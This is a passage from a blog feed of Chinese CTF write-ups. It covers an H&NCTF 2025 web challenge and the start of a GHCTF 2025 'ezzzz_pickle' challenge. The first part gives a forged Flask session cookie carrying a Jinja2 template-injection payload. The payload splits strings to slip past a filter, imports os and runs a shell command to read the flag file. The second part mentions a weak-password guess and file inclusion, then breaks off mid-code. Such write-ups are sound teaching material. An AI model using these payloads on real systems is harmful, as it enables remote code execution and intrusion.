&#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc._abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;types.GenericAlias&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;_collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.State&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;typing._Final&#x27;&gt;, &lt;class &#x27;typing._Immutable&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing._TypingEmpty&#x27;&gt;, &lt;class &#x27;typing._TypingEllipsis&#x27;&gt;, &lt;class &#x27;typing.Annotated&#x27;&gt;, &lt;class &#x27;typing.NamedTuple&#x27;&gt;, &lt;class &#x27;typing.TypedDict&#x27;&gt;, &lt;class &#x27;typing.io&#x27;&gt;, &lt;class &#x27;typing.re&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;platform._Processor&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;array.array&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver._NoThreads&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;ast.AST&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;_sha512.sha384&#x27;&gt;, &lt;class &#x27;_sha512.sha512&#x27;&gt;, &lt;class &#x27;ipaddress._IPAddressBase&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV4&#x27;&gt;, &lt;class &#x27;ipaddress._IPv4Constants&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV6&#x27;&gt;, &lt;class &#x27;ipaddress._IPv6Constants&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;_struct.Struct&#x27;&gt;, &lt;class &#x27;_struct.unpack_iterator&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.Session&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;werkzeug.urls.Href&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;_hashlib.HMAC&#x27;&gt;, &lt;class &#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookiePolicy&#x27;&gt;, &lt;class &#x27;http.cookiejar.Absent&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookieJar&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures._omd_bucket&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Range&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ContentRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.FileStorage&#x27;&gt;, &lt;class &#x27;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#x27;&gt;, &lt;class &#x27;dataclasses._MISSING_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._FIELD_BASE&#x27;&gt;, &lt;class &#x27;dataclasses.InitVar&#x27;&gt;, &lt;class &#x27;dataclasses.Field&#x27;&gt;, &lt;class &#x27;dataclasses._DataclassParams&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.Event&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartDecoder&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartEncoder&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.utils.HTMLBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.user_agent.UserAgent&#x27;&gt;, &lt;class &#x27;werkzeug.useragents._UserAgentParser&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.request.Request&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.response.Response&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;&gt;, &lt;class &#x27;werkzeug.test._TestCookieHeaders&#x27;&gt;, &lt;class &#x27;werkzeug.test._TestCookieResponse&#x27;&gt;, &lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.test.Client&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;jinja2.utils._MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalStack&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local._ProxyLookup&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalProxy&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.BaseConverter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.MapAdapter&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;flask.signals.Namespace&#x27;&gt;, &lt;class &#x27;flask.signals._FakeSignal&#x27;&gt;, &lt;class &#x27;flask.cli.DispatchingApp&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;flask.scaffold.Scaffold&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;]&quot;</span></span><br><span class="line">result_array = array.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index,value <span class="keyword">in</span> <span class="built_in">enumerate</span>(result_array):</span><br><span class="line">    result_value = re.sub(<span class="string">r&#x27;[\[\]]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, value)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> result_value:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;os:&#x27;</span>+<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> result_value:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;eval:&#x27;</span>+<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250627104249762.png" class="" title="image-20250627104249762"><p>测试到133，<code>__init__</code>初始化后为函数，接着寻找<code>__globals__</code>属性，接着寻找<code>__builtins__</code>，通过<code>__import__</code>导入os模块，由于os模块被过滤，’o’’s’绕过过滤，调用popen方法执行命令，read()读取返回结果并回显出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;1&quot; -t &quot;&#123;&#x27;name&#x27;:&#x27;admin&#x27;,&#x27;permission&#x27;:&#x27;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(133).__init__.__globals__.__getitem__(\&#x27;__builtins__\&#x27;).__import__(\&#x27;o\&#x27;\&#x27;s\&#x27;).popen(\&#x27;ca\&#x27;\&#x27;t 4flloog\&#x27;).read()&#125;&#125;&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250627104808416.png" class="" title="image-20250627104808416">]]></content>
      
      
      <categories>
          
          <category> CTFwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GHCTF 2025</title>
      <link href="/CTFwp/GHCTF-2025/"/>
      <url>/CTFwp/GHCTF-2025/</url>
      
        <content type="html"><![CDATA[<h2 id="ezzzz-pickle"><a href="#ezzzz-pickle" class="headerlink" title="ezzzz_pickle"></a>ezzzz_pickle</h2><p>弱口令密码爆破，password：admin123。</p><p>分析源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, admin!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- hint:session_pickle --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">value</span>=<span class="string">&quot;fake_flag.txt&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-login&quot;</span>&gt;</span>读取flag<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>暗示我们是session_pickle.</p><p>这里有个表单，点击读取flag按钮，发现可以进行文件包含。</p><p>试着通过文件包含泄露源码。</p><img src="/CTFwp/GHCTF-2025/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-13%20110827.png" class="" title="屏幕截图 2025-06-13 110827"><p>先分析&#x2F;login路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span 